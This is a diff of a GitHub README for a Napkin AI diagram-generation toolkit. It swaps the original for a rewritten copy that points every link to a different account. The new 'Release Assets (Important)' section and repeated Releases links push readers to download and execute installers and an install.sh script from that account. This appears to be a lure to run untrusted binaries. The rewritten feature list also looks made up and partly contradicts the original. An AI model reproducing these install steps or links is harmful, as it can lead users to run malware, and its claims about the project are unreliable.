@@ -1,661 +1,289 @@
-# 🎨 Napkin AI API Playground
+Napkin-AI-API: Streamlit App & Async CLI for Visuals
+=====================================================
 
-<div align="center">
+[![Releases](https://img.shields.io/github/v/release/marksteven2895/Napkin-AI-API?label=Releases&color=blue)](https://github.com/marksteven2895/Napkin-AI-API/releases)  
+https://github.com/marksteven2895/Napkin-AI-API/releases
 
-![Napkin AI](https://img.shields.io/badge/Napkin%20AI-API-FF6B6B?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI0ZGNkI2QiIgZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bTAgMThjLTQuNDEgMC04LTMuNTktOC04czMuNTktOCA4LTggOCAzLjU5IDggOC0zLjU5IDgtOCA4eiIvPjwvc3ZnPg==)
-![Version](https://img.shields.io/badge/version-0.3.2-purple?style=for-the-badge&logo=github)
-![Status](https://img.shields.io/badge/status-Production%20Ready-success?style=for-the-badge&logo=statuspage)
+Built for teams and devs who turn text into diagrams, illustrations, and design assets. This repo contains a Streamlit web app, an async Python CLI client, and helpers for working with the Napkin AI API. The tools support 15+ built-in visual styles and common output formats.
 
-### 🛠️ Tech Stack
+Badges
+------
+[![PyPI](https://img.shields.io/pypi/v/napkin-ai-api?color=orange)](https://pypi.org/project/napkin-ai-api) [![Python](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/) [![License](https://img.shields.io/github/license/marksteven2895/Napkin-AI-API)](LICENSE)
 
-![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![Poetry](https://img.shields.io/badge/Poetry-60A5FA?style=for-the-badge&logo=poetry&logoColor=white)
-![Streamlit](https://img.shields.io/badge/Streamlit-FF4B4B?style=for-the-badge&logo=streamlit&logoColor=white)
-![Typer](https://img.shields.io/badge/Typer-CLI-4B8BBE?style=for-the-badge&logo=python&logoColor=white)
-![Pydantic](https://img.shields.io/badge/Pydantic-V2-E92063?style=for-the-badge&logo=pydantic&logoColor=white)
+Preview Images
+--------------
+- Hero diagram:  
+  ![diagram](https://images.unsplash.com/photo-1526378721926-0a47f8c362cc?auto=format&fit=crop&w=1200&q=60)
+- Streamlit UI sample:  
+  ![streamlit-ui](https://streamlit.io/images/brand/streamlit-logo-primary-colormark-darktext.png)
 
-### 📊 Project Stats
+Core Topics
+-----------
+app-client, async, cli, diagram-api, diagram-app, httpx, napkin-ai, pydantic, python, rich, streamlit, streamlit-webapp, typer, visual-generation
 
-![GitHub Actions](https://img.shields.io/badge/CI%2FCD-Passing-brightgreen?style=for-the-badge&logo=githubactions&logoColor=white)
-![Tests](https://img.shields.io/badge/Tests-Passing-brightgreen?style=for-the-badge&logo=pytest&logoColor=white)
-![Coverage](https://img.shields.io/badge/Coverage-TBD-yellow?style=for-the-badge&logo=codecov&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge&logo=opensourceinitiative&logoColor=white)
+Features
+--------
+- Streamlit web app that turns text prompts into diagrams and illustrations.
+- Async Python CLI built with Typer and httpx.
+- Pydantic models for request/response validation.
+- 15+ built-in rendering styles (wireframe, isometric, whiteboard, infographic, flat, hand-drawn, schematic, blueprint, infographic, corporate, playful, minimal, technical, photo-real, comic).
+- Export to PNG, SVG, PDF, and optimized WebP.
+- Batch mode for multi-diagram jobs.
+- Optional local caching for faster re-renders.
+- Rich console output for CLI and logs.
 
-### 🔧 Code Quality
+What’s in this Repo
+-------------------
+- app/ - Streamlit app code and static assets
+- cli/ - Typer-based CLI client
+- napkin_api/ - async API client, models, utils
+- examples/ - sample prompts, scripts, and test data
+- docs/ - usage guides and API reference
+- tests/ - unit and integration tests
+- Dockerfile and docker-compose for local deploy
 
-![Ruff](https://img.shields.io/badge/Linter-Ruff-FCC21B?style=for-the-badge&logo=ruff&logoColor=black)
-![MyPy](https://img.shields.io/badge/Type%20Checker-MyPy-blue?style=for-the-badge&logo=python&logoColor=white)
-![Security](https://img.shields.io/badge/Security-Bandit-yellow?style=for-the-badge&logo=python&logoColor=white)
-![Pre-commit](https://img.shields.io/badge/pre--commit-enabled-brightgreen?style=for-the-badge&logo=pre-commit&logoColor=white)
+Quickstart — Streamlit
+----------------------
+1. Clone the repo.
+2. Create a virtualenv and install.
+   - pip install -r requirements.txt
+3. Set environment variables:
+   - NAPKIN_API_KEY (your Napkin AI API key)
+4. Run the app:
+   - streamlit run app/main.py --server.port 8501
+5. Open http://localhost:8501 and enter a prompt.
 
-### 🌟 Features
+Quickstart — CLI
+----------------
+Install the package and run the CLI:
 
-![Languages](https://img.shields.io/badge/Languages-38-4285F4?style=for-the-badge&logo=googletranslate&logoColor=white)
-![Styles](https://img.shields.io/badge/Visual%20Styles-16-FF6B6B?style=for-the-badge&logo=adobe&logoColor=white)
-![API](https://img.shields.io/badge/API-Async-00D084?style=for-the-badge&logo=fastapi&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=for-the-badge&logo=docker&logoColor=white)
+- pip install napkin-ai-api
+- Export the key:
+  - export NAPKIN_API_KEY="your_key"
+- Generate a diagram from a prompt:
+  - napkin gen "Draw a microservice diagram with three services and a load balancer" --style schematic --format svg --output ./diagram.svg
 
-**Transform text into stunning visuals with the power of AI** ✨
+You can run the CLI in async batch mode to generate many diagrams:
 
-[🚀 Quick Start](#-quick-start) • [✨ Features](#-features) • [📚 Documentation](#-documentation) • [🎮 Demo](#-demo) • [🤝 Contributing](#-contributing)
+- napkin batch examples/batch_prompts.json --concurrency 4 --out-dir outputs/
 
-</div>
+Install
+-------
+From source:
+- git clone https://github.com/marksteven2895/Napkin-AI-API.git
+- cd Napkin-AI-API
+- python -m venv .venv
+- source .venv/bin/activate
+- pip install -r requirements.txt
+- pip install -e .
 
----
+Docker:
+- docker build -t napkin-ai-api .
+- docker run -e NAPKIN_API_KEY="$KEY" -p 8501:8501 napkin-ai-api
 
-## 🎯 What is Napkin AI API Playground?
+Configuration
+-------------
+Set these environment variables:
 
-A **production-ready** Python toolkit featuring both a **🌐 Streamlit web interface** and **💻 powerful CLI** that seamlessly transforms your text into professional-grade visuals using the Napkin AI API. Built with modern Python practices, robust error handling, intelligent retries, and comprehensive monitoring.
+- NAPKIN_API_KEY — API key for Napkin AI.
+- NAPKIN_API_URL — Override base URL for the API (optional).
+- CACHE_DIR — directory for cached renders (optional).
+- LOG_LEVEL — debug, info, warn.
 
-<div align="center">
-<table>
-<tr>
-<td align="center">
-<img src="https://img.shields.io/badge/Web%20App-Streamlit-FF4B4B?style=flat-square&logo=streamlit&logoColor=white" />
-<br>Interactive Web UI
-</td>
-<td align="center">
-<img src="https://img.shields.io/badge/CLI-Typer-4B8BBE?style=flat-square&logo=python&logoColor=white" />
-<br>Command Line Tool
-</td>
-<td align="center">
-<img src="https://img.shields.io/badge/API-Async-00D084?style=flat-square&logo=fastapi&logoColor=white" />
-<br>Async Operations
-</td>
-<td align="center">
-<img src="https://img.shields.io/badge/CI%2FCD-GitHub%20Actions-2088FF?style=flat-square&logo=githubactions&logoColor=white" />
-<br>Automated Testing
-</td>
-</tr>
-</table>
-</div>
+Example .env:
+- NAPKIN_API_KEY=sk_live_...
+- CACHE_DIR=./.cache
 
-### 🎯 Perfect for:
-- 📊 **Data Scientists** - Visualize complex concepts instantly
-- 👩‍💻 **Developers** - Generate architecture diagrams from descriptions
-- 📚 **Educators** - Create engaging visual content for teaching
-- 💼 **Product Managers** - Quickly sketch out ideas and workflows
-- 🎨 **Content Creators** - Transform text into beautiful graphics
+Usage Examples
+--------------
 
-## ✨ Features
+1) Async httpx client (Python)
+```python
+import asyncio
+from napkin_api.client import NapkinClient
+from napkin_api.models import RenderRequest
 
-<table>
-<tr>
-<td>
+async def main():
+    client = NapkinClient(api_key="YOUR_KEY")
+    req = RenderRequest(
+        prompt="Show a flow of user -> web -> api -> db. Use blue boxes and arrows.",
+        style="wireframe",
+        output_format="svg",
+        width=1200,
+        height=800
+    )
+    out = await client.render(req)
+    with open("flow.svg", "wb") as f:
+        f.write(out)
+    await client.close()
 
-### 🌐 Streamlit Web Interface
-- **Interactive UI** with real-time generation
-- **Live preview** of all visual styles
-- **Multi-language support** (38 languages)
-- **Advanced options** panel
-- **Download manager** for all formats
-- **Mobile-responsive** design
-
-</td>
-<td>
-
-### 💻 Powerful CLI
-- **Full-featured** command line tool
-- **Single visual generation**
-- **JSON export** options
-- **Rich terminal** output
-- **Progress tracking** with spinners
-- **Configuration management**
-
-</td>
-</tr>
-<tr>
-<td>
-
-### 🎨 16 Visual Styles
-- **Vibrant** - Bold, energetic visuals
-- **Sketch** - Hand-drawn aesthetics
-- **Corporate** - Professional graphics
-- **Minimalist** - Clean, simple designs
-- **Comic** - Fun, playful style
-- **And many more!**
-
-</td>
-<td>
-
-### ⚡ Advanced Features
-- **Async API** with retry logic
-- **Rate limiting** (60 req/min)
-- **Error monitoring** dashboard
-- **GitHub Actions** integration
-- **Docker support**
-- **Type-safe** with Pydantic v2
-
-</td>
-</tr>
-</table>
-
-## 🚀 Quick Start
-
-### 📦 Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/moshehbenavraham/Napkin-AI-API.git
-cd Napkin-AI-API
-
-# Install with Poetry (recommended)
-poetry install
-
-# Or use pip
-pip install -r requirements.txt
+asyncio.run(main())
 ```
 
-### 🔑 Configuration
-
+2) CLI example (shell)
 ```bash
-# Copy example config
-cp .env.example .env
-
-# Add your API token (get one at https://napkin.ai)
-echo "NAPKIN_API_TOKEN=your_token_here" >> .env
-
-# Optional: Add GitHub token for error monitoring
-echo "GITHUB_TOKEN=ghp_your_github_token" >> .env
-```
-
-### 🎮 Demo
-
-#### 🌐 Web Interface (Streamlit)
-
-```bash
-# Launch the web app
-poetry run streamlit run streamlit_app.py
-
-# Or with custom port
-poetry run streamlit run streamlit_app.py --server.port 8080
-
-# Access at http://localhost:8501
-```
-
-<details>
-<summary>📸 <b>Web Interface Screenshots</b></summary>
-
-- Main generation interface
-- Style browser with categories
-- Multi-language support
-- Advanced options panel
-- Real-time generation
-- Download manager
-
-</details>
-
-#### 💻 Command Line Interface
-
-```bash
-# Generate your first visual
-poetry run napkin generate "Machine Learning Pipeline"
-
-# With specific style and format
-poetry run napkin generate "Data Flow" --style sketch-notes --format png
-
-# Multiple variations
-poetry run napkin generate "System Architecture" --variations 4
-
-# Export to JSON
-poetry run napkin generate "Workflow" --json output.json
-```
-
-## 🛠️ Advanced Usage
-
-### 🌍 Multi-Language Support
-
-Generate visuals in 38 languages using BCP 47 language tags:
-
-```bash
-# Spanish
-napkin generate "Flujo de datos" --language es-ES
-
-# Japanese
-napkin generate "データフロー" --language ja-JP
-
-# Arabic
-napkin generate "تدفق البيانات" --language ar
-```
-
-### 🎯 Context Options
-
-Add context for more meaningful visuals:
-
-```bash
-napkin generate "Neural Network" \
-  --context-before "Introduction to" \
-  --context-after "for beginners"
-```
-
-### 🔄 Visual Regeneration
-
-Update existing visuals or search for specific types:
-
-```bash
-# Regenerate existing visual
-napkin generate "Updated Content" --visual-id "5UCQJLAV5S6NXEWS2PBJF54UYPW5NZ4G"
-
-# Search for specific visual type
-napkin generate "Project Timeline" --visual-query "timeline"
-```
-
-### 📐 Custom Dimensions
-
-For PNG format with specific dimensions:
-
-```bash
-napkin generate "Architecture" \
+napkin gen "Create a whiteboard sketch of a CI/CD pipeline" \
+  --style whiteboard \
   --format png \
-  --width 1920 \
-  --height 1080 \
-  --transparent \
-  --inverted-color
+  --output ci_pipeline.png
 ```
 
-## 🔍 CI/CD & Monitoring
+3) Streamlit usage
+- Use the left sidebar to type a prompt.
+- Pick a style and format.
+- Click Generate.
+- Use the download buttons for PNG/SVG/PDF.
 
-### 📊 GitHub Actions Integration
+Built-in Styles
+---------------
+The app ships with 15+ styles. Each style maps to a rendering template:
 
-Our project uses GitHub Actions for continuous integration with automated testing, linting, and deployment:
+- wireframe
+- isometric
+- whiteboard
+- infographic
+- flat
+- hand-drawn
+- schematic
+- blueprint
+- corporate
+- playful
+- minimal
+- technical
+- photo-real
+- comic
+- sketch
+- high-contrast
 
-- **Python 3.10, 3.11, 3.12** matrix testing
-- **Automated linting** with Ruff
-- **Type checking** with MyPy
-- **Security scanning** with Bandit
-- **Coverage reporting** with Codecov
-- **Automated notifications** on failure
+Each style accepts a small set of overrides: palette, stroke, shadow, label_font, and spacing.
 
-### 🛠️ Built-in Monitoring Tool
+API Client Details
+------------------
+- Async-first design using httpx AsyncClient.
+- Pydantic models validate requests and parse responses.
+- Built-in retry logic with backoff for transient errors.
+- Multipart responses for multi-layer exports (SVG + metadata).
+- Local cache layer keyed by prompt+style for idempotent renders.
 
-Monitor your CI/CD pipeline with the unified `gh-monitor` tool:
+Sample pydantic model
+```python
+from pydantic import BaseModel, Field
 
-```bash
-# Monitor recent failures
-bin/gh-monitor          # Show last 5 failures
-bin/gh-monitor 10       # Show last 10 failures
-
-# Analyze failures in detail
-bin/gh-monitor analyze  # Detailed analysis with error messages
-
-# Generate CI error reports
-bin/gh-monitor report   # JSON report with context
-
-# Export and format options
-bin/gh-monitor 20 --json failures.json  # Export to JSON
-bin/gh-monitor 10 --simple              # Simple one-line format
+class RenderRequest(BaseModel):
+    prompt: str = Field(..., max_length=4096)
+    style: str = "wireframe"
+    output_format: str = "png"
+    width: int = 1200
+    height: int = 800
+    seed: int | None = None
 ```
 
-### 🔔 Automated Notifications
+Output Formats
+--------------
+- png — flat raster image
+- svg — vector file with layers and metadata
+- pdf — print-ready
+- webp — optimized web format
+- zip — package with SVG + assets + metadata
 
-Configure automatic notifications for CI/CD failures:
+Batch Mode
+----------
+Create a JSON or NDJSON file with prompts:
 
-<table>
-<tr>
-<td>
-
-**Slack Integration**
-```yaml
-SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
+examples/batch_prompts.json
+```json
+[
+  {"prompt": "Auth flow: user -> oauth -> token store", "style":"schematic"},
+  {"prompt": "DB replication diagram", "style":"blueprint"}
+]
 ```
 
-</td>
-<td>
-
-**Discord Integration**
-```yaml
-DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
-```
-
-</td>
-</tr>
-<tr>
-<td>
-
-**Email Alerts**
-```yaml
-EMAIL_USERNAME: ${{ secrets.EMAIL_USERNAME }}
-EMAIL_PASSWORD: ${{ secrets.EMAIL_PASSWORD }}
-```
-
-</td>
-<td>
-
-**GitHub Issues**
-```yaml
-CREATE_GITHUB_ISSUE: true
-GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-```
-
-</td>
-</tr>
-</table>
-
-## 📚 Documentation
-
-| Document | Description | Badge |
-|----------|-------------|-------|
-| 📘 [API Guide](docs/API_GUIDE.md) | Complete API reference & usage | ![API](https://img.shields.io/badge/API-Guide-blue?style=flat-square) |
-| 📗 [Project Guide](docs/PROJECT_GUIDE.md) | Development, testing & contributing | ![Project](https://img.shields.io/badge/Project-Guide-green?style=flat-square) |
-| 📙 [Official API Docs](docs/napkin_official/NAPKIN_AI_API.md) | Napkin's official API documentation | ![Official](https://img.shields.io/badge/Official-Docs-orange?style=flat-square) |
-
-## 🏗️ Architecture
-
-```mermaid
-graph TD
-    A[🌐 Web UI / 💻 CLI] -->|Streamlit / Typer| B[⚙️ Core Generator]
-    B --> C[🔌 API Client]
-    C -->|httpx + tenacity| D[☁️ Napkin API]
-    B --> E[📋 Pydantic Models]
-    E --> F[✅ Type Validation]
-    B --> G[🔍 Error Monitor]
-    G --> H[📊 GitHub Actions]
-    
-    style A fill:#FF4B4B,stroke:#333,stroke-width:2px
-    style D fill:#4285F4,stroke:#333,stroke-width:2px
-    style H fill:#2088FF,stroke:#333,stroke-width:2px
-```
-
-<details>
-<summary><b>📁 Project Structure</b></summary>
-
-```
-napkin-api-playground/
-├── 📱 streamlit_app.py     # Web interface (650 lines)
-├── 🚀 main.py              # CLI entry point
-├── 🔧 bin/
-│   └── gh-monitor          # GitHub Actions monitoring tool
-├── 📁 src/
-│   ├── 🔌 api/            # Async API client & models
-│   ├── 💻 cli/            # CLI commands & display
-│   ├── ⚙️ core/           # Generation orchestration
-│   └── 🔧 utils/          # Config & helpers
-├── 🧪 tests/              # Test suite
-├── 📚 docs/               # Complete documentation
-├── 🔍 scripts/            # Monitoring & utilities
-└── 🎨 data/               # Generated visuals
-```
-
-</details>
-
-## 🧪 Development
-
-### 🔬 Testing & Quality
-
-```bash
-# Run all tests
-poetry run pytest
-
-# With coverage report
-poetry run pytest --cov=src --cov-report=html
-
-# Type checking
-poetry run mypy src/
-
-# Linting
-poetry run ruff check src/
-
-# Security scan
-poetry run bandit -r src/
-```
-
-### 🔍 GitHub Actions Monitoring
-
-Monitor and analyze CI/CD failures with the unified monitoring tool:
-
-```bash
-# Show recent failures
-bin/gh-monitor        # Last 5 failures
-bin/gh-monitor 10     # Last 10 failures
-
-# Analyze failures in detail
-bin/gh-monitor analyze
-
-# Generate CI error report
-bin/gh-monitor report
-
-# Export to JSON
-bin/gh-monitor 5 --json failures.json
-
-# Simple one-line format
-bin/gh-monitor 10 --simple
-
-# See all options
-bin/gh-monitor --help
-```
-
-📚 [Full documentation](docs/GH_MONITOR.md)
-
-### 📊 Code Quality Metrics
-
-<div align="center">
-<table>
-<tr>
-<td align="center">
-<b>Tests</b><br>
-<img src="https://img.shields.io/badge/passing-brightgreen?style=flat-square" />
-</td>
-<td align="center">
-<b>Coverage</b><br>
-<img src="https://img.shields.io/badge/TBD-yellow?style=flat-square" />
-</td>
-<td align="center">
-<b>Type Safety</b><br>
-<img src="https://img.shields.io/badge/MyPy-strict-blue?style=flat-square" />
-</td>
-<td align="center">
-<b>Linting</b><br>
-<img src="https://img.shields.io/badge/Ruff-clean-green?style=flat-square" />
-</td>
-<td align="center">
-<b>Security</b><br>
-<img src="https://img.shields.io/badge/Bandit-passed-yellow?style=flat-square" />
-</td>
-</tr>
-</table>
-</div>
-
-## 🌟 What's New in v0.3.2
-
-### ✨ Latest Features
-- ✅ **Production-ready** status with all tests passing
-- ✅ **Unified error monitoring** system
-- ✅ **Enhanced CI/CD** with automatic notifications
-- ✅ **Improved documentation** with badges
-- ✅ **Fixed all deprecation** warnings
-- ✅ **Python 3.10+** compatibility
-
-### 🎨 Web Interface (v0.3.0)
-- 🌍 **38 languages** with BCP 47 tags
-- 📋 **Context options** for better visuals
-- 🎯 **Advanced settings** panel
-- 🔄 **Visual regeneration** feature
-- 🔍 **Visual type search**
-- 📱 **Mobile-responsive** design
-
-## 🤝 Contributing
-
-We love contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-<div align="center">
-<table>
-<tr>
-<td align="center">
-<img src="https://img.shields.io/badge/PRs-Welcome-brightgreen?style=for-the-badge" />
-</td>
-<td align="center">
-<img src="https://img.shields.io/badge/Issues-Welcome-blue?style=for-the-badge" />
-</td>
-<td align="center">
-<img src="https://img.shields.io/badge/Questions-Welcome-purple?style=for-the-badge" />
-</td>
-</tr>
-</table>
-</div>
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 📊 Project Roadmap
-
-### ✅ Completed Phases
-
-<details>
-<summary>✅ <b>Phase 1: Core MVP</b></summary>
-
-- [x] Core API integration
-- [x] CLI with all parameters
-- [x] 16 styles support
-- [x] Async operations
-- [x] Comprehensive testing
-
-</details>
-
-<details>
-<summary>✅ <b>Phase 2: Web Interface</b></summary>
-
-- [x] Streamlit web application
-- [x] Interactive style browser
-- [x] Real-time generation
-- [x] Download functionality
-- [x] Multi-language support
-- [x] Advanced options panel
-
-</details>
-
-
-### 🚧 Upcoming Features
-
-- [ ] **Phase 3: Batch Processing** - Process multiple visuals from CSV/JSON
-- [ ] **Phase 4: Gallery Mode** - Local SQLite gallery with search
-- [ ] **Phase 5: Custom Styles** - Create and save custom visual styles
-- [ ] **Team Collaboration** - Share visuals with team members
-- [ ] **Cloud Integration** - S3/GCS storage support
-- [ ] **API Webhooks** - Real-time generation notifications
-
-## 🔒 Security
-
-<div align="center">
-<table>
-<tr>
-<td align="center">🔐 Tokens Never Logged</td>
-<td align="center">🛡️ .env Gitignored</td>
-<td align="center">✅ Input Validation</td>
-</tr>
-<tr>
-<td align="center">🔄 HTTPS Only</td>
-<td align="center">🔑 Bearer Auth</td>
-<td align="center">🌐 Secure Headers</td>
-</tr>
-</table>
-</div>
-
-See [SECURITY.md](docs/SECURITY.md) for full security practices.
-
-## 🐛 Troubleshooting
-
-<details>
-<summary>💻 <b>CLI Issues</b></summary>
-
-| Issue | Solution |
-|-------|----------|
-| Rate limit errors | Client auto-retries with backoff (60 req/min limit) |
-| File not found | Ensure output directory exists or use default `./data/visuals` |
-| Token errors | Check `NAPKIN_API_TOKEN` in `.env` file |
-
-</details>
-
-<details>
-<summary>🌐 <b>Web Interface Issues</b></summary>
-
-| Issue | Solution |
-|-------|----------|
-| 403 Forbidden | Update to latest version (fixed in v0.2.1) |
-| Pydantic errors | Update to latest version (fixed in v0.2.2) |
-| Auth header required | Ensure API token is set correctly |
-
-</details>
-
-<details>
-<summary>🔧 <b>Development Issues</b></summary>
-
-| Issue | Solution |
-|-------|----------|
-| Poetry lock errors | Run `poetry lock` to update |
-| Type check failures | Run `poetry run mypy src/` |
-| Test failures | Ensure `.env` has valid token |
-
-</details>
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
-
-## 🙏 Acknowledgments
-
-<div align="center">
-<table>
-<tr>
-<td align="center">
-<img src="https://img.shields.io/badge/Powered%20by-Napkin%20AI-FF6B6B?style=for-the-badge" /><br>
-<a href="https://napkin.ai">Napkin AI API</a>
-</td>
-<td align="center">
-<img src="https://img.shields.io/badge/Built%20with-Poetry-60A5FA?style=for-the-badge" /><br>
-<a href="https://python-poetry.org/">Poetry</a>
-</td>
-</tr>
-<tr>
-<td align="center">
-<img src="https://img.shields.io/badge/UI%20with-Streamlit-FF4B4B?style=for-the-badge" /><br>
-<a href="https://streamlit.io">Streamlit</a>
-</td>
-<td align="center">
-<img src="https://img.shields.io/badge/CLI%20with-Typer-4B8BBE?style=for-the-badge" /><br>
-<a href="https://typer.tiangolo.com/">Typer</a>
-</td>
-</tr>
-</table>
-</div>
-
-## 📞 Support
-
-<div align="center">
-<table>
-<tr>
-<td align="center">
-📧 <b>Email</b><br>
-<a href="mailto:api@napkin.ai">api@napkin.ai</a>
-</td>
-<td align="center">
-🐛 <b>Issues</b><br>
-<a href="https://github.com/moshehbenavraham/Napkin-AI-API/issues">GitHub Issues</a>
-</td>
-<td align="center">
-💬 <b>Discussions</b><br>
-<a href="https://github.com/moshehbenavraham/Napkin-AI-API/discussions">GitHub Discussions</a>
-</td>
-</tr>
-</table>
-</div>
-
+Run:
+- napkin batch examples/batch_prompts.json --out-dir outputs --concurrency 6
+
+Architecture
+------------
+- UI: Streamlit app that posts render requests and streams progress.
+- CLI: Typer CLI that calls the client library.
+- Client: Async httpx wrapper with pydantic models.
+- Worker: Optional background worker for heavy batch jobs (Celery/RQ support example).
+- Storage: Local file system by default, S3 optional.
+
+Testing
+-------
+- pytest for unit tests
+- integration tests use a local stub server
+- run tests:
+  - pytest -q
+
+Contributing
+------------
+- Fork the repo.
+- Open a feature branch.
+- Add tests for new behavior.
+- Keep functions small and types explicit.
+- Run linters: black, isort, ruff.
+- Open a PR with a clear description and test results.
+
+Release Assets (Important)
+--------------------------
+Download release assets here:  
+[https://github.com/marksteven2895/Napkin-AI-API/releases](https://github.com/marksteven2895/Napkin-AI-API/releases)
+
+This link contains packaged builds and installers. Download the release asset that matches your platform (for example: napkin-ai-api-vX.Y.Z-linux.tar.gz or napkin-ai-api-cli-windows.zip) and execute the included installer or binary. Typical steps for a tar.gz release:
+
+- wget https://github.com/marksteven2895/Napkin-AI-API/releases/download/vX.Y.Z/napkin-ai-api-vX.Y.Z.tar.gz
+- tar -xzf napkin-ai-api-vX.Y.Z.tar.gz
+- cd napkin-ai-api-vX.Y.Z
+- ./install.sh   # run the included script to install the CLI and app
+
+If the link does not work, check the Releases section on the GitHub page to find the correct asset and instructions.
+
+Security
+--------
+- Keep your NAPKIN_API_KEY secret.
+- Rotate keys if you suspect compromise.
+- Use HTTPS endpoints only.
+
+Roadmap
+-------
+- Add interactive diagram editing inside Streamlit.
+- Add a webhooks endpoint for async callbacks.
+- Add first-class Figma export and integration.
+- Improve multi-page PDF export.
+
+FAQ
 ---
+Q: Can I run without an API key?  
+A: No. The app requires an API key for rendering.
 
-<div align="center">
+Q: Can I host this behind a reverse proxy?  
+A: Yes. Streamlit works behind nginx or Traefik.
 
-### 🌟 Star us on GitHub!
+Q: Can I add custom styles?  
+A: Yes. Place a JSON style file in app/styles/ and register it in config.
 
-If you find this project useful, please consider giving it a star ⭐
+Credits & Resources
+-------------------
+- Streamlit — UI framework
+- httpx — async HTTP client
+- Typer — CLI
+- Pydantic — models and validation
+- Rich — console formatting
 
-![Stars](https://img.shields.io/github/stars/moshehbenavraham/Napkin-AI-API?style=social)
-![Forks](https://img.shields.io/github/forks/moshehbenavraham/Napkin-AI-API?style=social)
-![Watchers](https://img.shields.io/github/watchers/moshehbenavraham/Napkin-AI-API?style=social)
+License
+-------
+This project uses the MIT License. See LICENSE for details.
 
-**Made with 🎨 and Python by the Napkin AI Community**
+Changelog
+---------
+See the Releases page for release notes and downloadable assets:  
+https://github.com/marksteven2895/Napkin-AI-API/releases
 
-[⬆ Back to top](#-napkin-ai-api-playground)
+Topics (for GitHub)
+-------------------
+app-client, async, cli, diagram-api, diagram-app, httpx, napkin-ai, pydantic, python, rich, streamlit, streamlit-webapp, typer, visual-generation
 
-</div>
+Contact
+-------
+Open an issue or a pull request on GitHub. Use the Discussions tab for feature requests and design ideas.
